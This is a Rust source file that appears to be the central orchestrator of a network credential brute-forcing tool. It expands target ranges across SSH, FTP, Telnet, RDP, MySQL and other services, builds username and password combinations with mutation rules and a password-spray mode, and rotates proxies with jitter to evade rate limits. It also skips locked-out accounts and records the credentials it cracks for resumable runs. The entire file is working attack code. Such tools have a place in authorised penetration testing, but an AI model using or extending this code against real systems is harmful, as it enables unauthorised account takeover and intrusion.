use std::collections::HashSet;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use chrono::Utc;
use futures::stream::{FuturesUnordered, StreamExt};
use tokio::sync::Semaphore;

use super::cidr::expand_targets;
use super::config::AttackConfig;
use super::credential::Credential;
use super::result::{AttackSummary, AuthResult};
use super::rules::{apply_rules, load_rules};
use super::target::{parse_targets, Target};
use super::wordlist::{load_combo_list, load_wordlist};
use crate::protocols::get_protocol;
use crate::proxy::{load_proxy_list, ProxyConfig};
use crate::utils::output::OutputHandler;
use crate::utils::patterns::{classify_error, compute_backoff, should_rotate_proxy, should_skip_user, ResponseCategory};
use crate::utils::ratelimit::{JitterDelay, RateLimiter};
use crate::utils::resume::SessionState;

pub struct AttackOrchestrator {
    config: AttackConfig,
    targets: Vec<Target>,
    credentials: Vec<Credential>,
    proxies: Vec<ProxyConfig>,
    results: Vec<AuthResult>,
    session: Option<SessionState>,
    output: OutputHandler,
    rate_limiter: RateLimiter,
    jitter: JitterDelay,
    proxy_failures: Arc<std::sync::Mutex<Vec<u64>>>,
    skipped_users: HashSet<String>,
    running: Arc<AtomicBool>,
}

impl AttackOrchestrator {
    pub async fn new(config: AttackConfig, running: Arc<AtomicBool>) -> Result<Self, String> {
        config.validate()?;

        let targets = Self::load_targets(&config).await?;
        let credentials = Self::load_credentials(&config).await?;
        let proxies = Self::load_proxies(&config);

        let output = OutputHandler::new(
            config.output_format.clone(),
            config.output_file.as_deref(),
        )?;

        let session = if let Some(resume_path) = &config.resume_file {
            match SessionState::load(resume_path) {
                Ok(state) => Some(state),
                Err(e) => {
                    log::warn!("Cannot load resume file (starting fresh): {}", e);
                    None
                }
            }
        } else {
            None
        };

        let rate_limiter = RateLimiter::new(config.rate_limit);
        let jitter = JitterDelay::new(config.delay, 100);

        let proxy_count = proxies.len();
        Ok(AttackOrchestrator {
            targets,
            credentials,
            proxies,
            results: Vec::new(),
            session,
            output,
            rate_limiter,
            jitter,
            config,
            proxy_failures: Arc::new(std::sync::Mutex::new(vec![0u64; proxy_count.max(1)])),
            skipped_users: HashSet::new(),
            running,
        })
    }

    async fn load_targets(config: &AttackConfig) -> Result<Vec<Target>, String> {
        let mut target_strings: Vec<String> = Vec::new();

        if let Some(file_path) = &config.target_file {
            let file_targets = load_wordlist(file_path).await?;
            target_strings.extend(file_targets);
        }

        let mut expanded: Vec<(String, Option<u16>)> = Vec::new();
        for spec in &config.targets {
            let hosts = expand_targets(&[spec.clone()]);
            expanded.extend(hosts);
        }
        for (host, port_opt) in &expanded {
            if let Some(p) = port_opt {
                target_strings.push(format!("{}:{}", host, p));
            } else {
                target_strings.push(host.clone());
            }
        }

        let protocols: Vec<String> = if config.protocols.is_empty() {
            vec!["ssh".to_string()]
        } else {
            config.protocols.clone()
        };

        let ports: Vec<u16> = if config.ports.is_empty() {
            vec![22, 21, 23, 25, 80, 443, 110, 3389, 3306, 587, 993, 995]
        } else {
            config.ports.clone()
        };

        let mut targets = parse_targets(&target_strings, &protocols, &ports);

        for target in &mut targets {
            if !target.is_resolved() {
                let _ = target.resolve(config.timeout).await;
            }
        }

        if targets.is_empty() {
            return Err("No valid targets after parsing".into());
        }

        log::info!("Loaded {} targets ({} after expansion)", config.targets.len(), targets.len());
        Ok(targets)
    }

    async fn load_credentials(config: &AttackConfig) -> Result<Vec<Credential>, String> {
        let mut credentials = Vec::new();

        if let Some(combo_path) = &config.combo_file {
            let combos = load_combo_list(combo_path).await?;
            for (user, pass) in combos {
                credentials.push(Credential::new(user, pass));
            }
            return Ok(credentials);
        }

        let users = if !config.users.is_empty() {
            config.users.clone()
        } else if let Some(user_path) = &config.user_file {
            load_wordlist(user_path).await?
        } else {
            return Err("No users provided".into());
        };

        let passwords = if !config.passwords.is_empty() {
            config.passwords.clone()
        } else if let Some(pass_path) = &config.password_file {
            let base_passwords = load_wordlist(pass_path).await?;
            if let Some(rule_path) = &config.rule_file {
                if Path::new(rule_path).exists() {
                    match load_rules(rule_path) {
                        Ok(rules) => {
                            log::info!("Loaded {} mutation rules from {:?}", rules.len(), rule_path);
                            let mutated = apply_rules(&base_passwords, &rules, config.max_mutations);
                            log::info!("Expanded {} passwords to {} via rules", base_passwords.len(), mutated.len());
                            mutated
                        }
                        Err(e) => {
                            log::warn!("Failed to load rules: {}. Using base passwords.", e);
                            base_passwords
                        }
                    }
                } else {
                    base_passwords
                }
            } else {
                base_passwords
            }
        } else {
            return Err("No passwords provided".into());
        };

        if users.is_empty() || passwords.is_empty() {
            return Err("Empty user or password list".into());
        }

        credentials = build_credentials(config, &users, &passwords);
        log::info!("Loaded {} credentials ({} users × {} passwords{}",
            credentials.len(), users.len(), passwords.len(),
            if config.single_user_mode { ", single-user mode" } else { "" }
        );
        Ok(credentials)
    }

    fn load_proxies(config: &AttackConfig) -> Vec<ProxyConfig> {
        let mut proxies = Vec::new();
        if let Some(proxy_path) = &config.proxy_file {
            match load_proxy_list(proxy_path) {
                Ok(p) => proxies = p,
                Err(e) => log::warn!("Failed to load proxies: {}", e),
            }
        }
        if let Some(ref single_proxy) = config.proxy {
            if let Ok(p) = ProxyConfig::parse(single_proxy) {
                proxies.push(p);
            }
        }
        proxies
    }

    fn get_proxy_for(&self, index: usize) -> Option<ProxyConfig> {
        if self.proxies.is_empty() {
            None
        } else {
            Some(self.proxies[index % self.proxies.len()].clone())
        }
    }

    pub async fn run(&mut self) -> AttackSummary {
        let start_time = Utc::now();
        let total_combinations = self.targets.len() * self.credentials.len();
        let max_concurrent = self.config.threads;
        let stop_on_first = self.config.stop_on_first;

        log::info!("Starting attack: {} targets × {} credentials ({} total attempts)",
            self.targets.len(), self.credentials.len(), total_combinations);

        self.output.init_progress(total_combinations as u64);

        let semaphore = Arc::new(Semaphore::new(max_concurrent));
        let mut attempts = Vec::new();
        let mut attempt_count = 0u64;
        let mut proxy_cycle_counter = 0u64;

        'target_loop: for target_idx in 0..self.targets.len() {
            let target = &self.targets[target_idx];

            for cred_idx in 0..self.credentials.len() {
                if !self.running.load(Ordering::SeqCst) {
                    log::info!("Graceful shutdown requested. Stopping at attempt {}.", attempt_count);
                    break 'target_loop;
                }

                let credential = &self.credentials[cred_idx];

                if self.skipped_users.contains(&credential.username) {
                    attempt_count += 1;
                    self.output.inc_progress();
                    continue;
                }

                let target_clone = target.clone();
                let credential_clone = credential.clone();
                let permit = Arc::clone(&semaphore);
                let proxy = self.get_proxy_for(proxy_cycle_counter as usize);
                let timeout = self.config.timeout;
                let retries = self.config.retries;
                let stop_early = stop_on_first;

                if let Some(ref session) = self.session {
                    if session.is_tested(&credential_clone.username, &credential_clone.password) {
                        attempt_count += 1;
                        self.output.inc_progress();
                        continue;
                    }
                }

                self.rate_limiter.wait_if_needed().await;
                self.jitter.delay().await;

                let protocol_handler = match get_protocol(&target_clone.protocol) {
                    Some(p) => p,
                    None => {
                        self.output.inc_progress();
                        continue;
                    }
                };

                let proxy_fails = Arc::clone(&self.proxy_failures);
                let current_proxy_idx = proxy_cycle_counter as usize;
                let running_flag = Arc::clone(&self.running);

                let handle = tokio::spawn(async move {
                    let _permit = permit.acquire().await.unwrap();
                    let mut last_result = None;
                    let current_retries = retries;
                    let mut current_proxy = proxy;

                    for attempt in 0..=current_retries {
                        if !running_flag.load(Ordering::SeqCst) {
                            break;
                        }

                        let result = protocol_handler
                            .authenticate(&target_clone, &credential_clone, timeout, &current_proxy)
                            .await;

                        let classified = classify_error(result.error.as_deref(), result.success);

                        if result.success {
                            last_result = Some(result);
                            break;
                        }

                        if should_skip_user(&classified) {
                            last_result = Some(AuthResult {
                                error: Some(format!("Account locked: {}", classified.message)),
                                ..result
                            });
                            break;
                        }

                        if should_rotate_proxy(&classified) && current_proxy.is_some() {
                            if let Ok(mut fails) = proxy_fails.lock() {
                                if current_proxy_idx < fails.len() {
                                    fails[current_proxy_idx] += 1;
                                }
                            }
                            current_proxy = None;
                        }

                        if attempt == current_retries {
                            last_result = Some(result);
                            break;
                        }

                        let backoff = compute_backoff(attempt);
                        tokio::time::sleep(backoff).await;
                    }

                    (last_result.unwrap(), stop_early)
                });

                attempts.push(handle);
                attempt_count += 1;
                proxy_cycle_counter += 1;
            }
        }

        let mut stream: FuturesUnordered<_> = attempts.into_iter().collect();
        let mut successes_global = 0u64;
        let mut failures_global = 0u64;
        let mut errors_global = 0u64;
        let mut lockout_events = 0u64;
        let mut rate_limit_events = 0u64;

        while let Some(fut_result) = stream.next().await {
            match fut_result {
                Ok((result, stop_early)) => {
                    let classified = classify_error(result.error.as_deref(), result.success);

                    match classified.category {
                        ResponseCategory::AccountLocked => {
                            lockout_events += 1;
                            self.skipped_users.insert(result.username.clone());
                            log::warn!("Account locked: {} on {}:{}", result.username, result.target_host, result.target_port);
                        }
                        ResponseCategory::RateLimited => {
                            rate_limit_events += 1;
                            log::warn!("Rate limited on {}:{}, consider increasing delay", result.target_host, result.target_port);
                        }
                        _ => {}
                    }

                    if result.success {
                        successes_global += 1;
                    } else if result.error.is_some() {
                        errors_global += 1;
                    } else {
                        failures_global += 1;
                    }

                    if let Some(ref mut session) = self.session {
                        session.mark_tested(&result.username, &result.password);
                        if result.success {
                            session.add_success(
                                &result.target_host,
                                &result.protocol,
                                &result.username,
                                &result.password,
                            );
                        }
                        if self.config.resume_file.is_some() {
                            if let Some(ref resume_path) = self.config.resume_file {
                                let _ = session.save(resume_path);
                            }
                        }
                    }

                    self.output.write_result(&result);
                    self.results.push(result.clone());
                    self.output.inc_progress();

                    if stop_early && result.success {
                        log::info!("Stop-on-first triggered. Halting.");
                        break;
                    }
                }
                Err(e) => {
                    log::error!("Task panicked: {}", e);
                    errors_global += 1;
                }
            }
        }

        self.output.finish_progress();

        if let Some(ref session) = self.session {
            if let Some(ref resume_path) = self.config.resume_file {
                let _ = session.save(resume_path);
            }
        }

        if lockout_events > 0 {
            log::warn!("Detected {} account lockout(s), skipped users: {:?}", lockout_events, self.skipped_users);
        }
        if rate_limit_events > 0 {
            log::warn!("Detected {} rate limiting event(s)", rate_limit_events);
        }

        let end_time = Utc::now();
        let duration = end_time.signed_duration_since(start_time).to_std().unwrap_or_default();

        let summary = AttackSummary {
            start_time,
            end_time: Some(end_time),
            total_targets: self.targets.len(),
            total_credentials: self.credentials.len(),
            attempts: attempt_count,
            successes: successes_global,
            failures: failures_global,
            errors: errors_global,
            results: self.results.clone(),
            total_duration: Some(duration),
        };

        self.output.write_summary(&summary);
        summary
    }
}

fn build_credentials(config: &AttackConfig, users: &[String], passwords: &[String]) -> Vec<Credential> {
    let mut credentials = Vec::new();
    if config.spray_mode {
        for pass in passwords {
            for user in users {
                credentials.push(Credential::new(user.clone(), pass.clone()));
            }
        }
    } else if config.single_user_mode {
        if let Some(user) = users.first() {
            for pass in passwords {
                credentials.push(Credential::new(user.clone(), pass.clone()));
            }
        }
    } else {
        for user in users {
            for pass in passwords {
                credentials.push(Credential::new(user.clone(), pass.clone()));
            }
        }
    }
    credentials
}
